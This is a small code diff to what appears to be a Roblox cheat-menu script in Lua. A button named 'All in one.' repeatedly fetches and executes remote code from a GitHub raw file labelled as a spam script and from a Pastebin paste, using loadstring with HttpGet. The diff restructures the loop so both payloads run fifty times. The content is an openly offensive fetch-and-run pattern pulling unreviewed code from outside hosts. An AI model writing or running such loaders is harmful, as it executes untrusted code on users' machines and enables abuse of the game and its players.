@@ -180,12 +180,9 @@ Tab1Section2:NewButton("All in one.", "why u click", function()
     local i = 1
     while i <= 50 do
         loadstring(game:HttpGet("https://raw.githubusercontent.com/FlavorYT/SPAM-EZ-GG/main/MADE%20BY%20FLAVORLEAKS%20DISCORD"))()
-        i = i + 1
-    
-    local i = 1
-    while i <= 10 do
         loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
         i = i + 1
+    end
 end)
 
 local Tab2 = Window:NewTab("Extra")
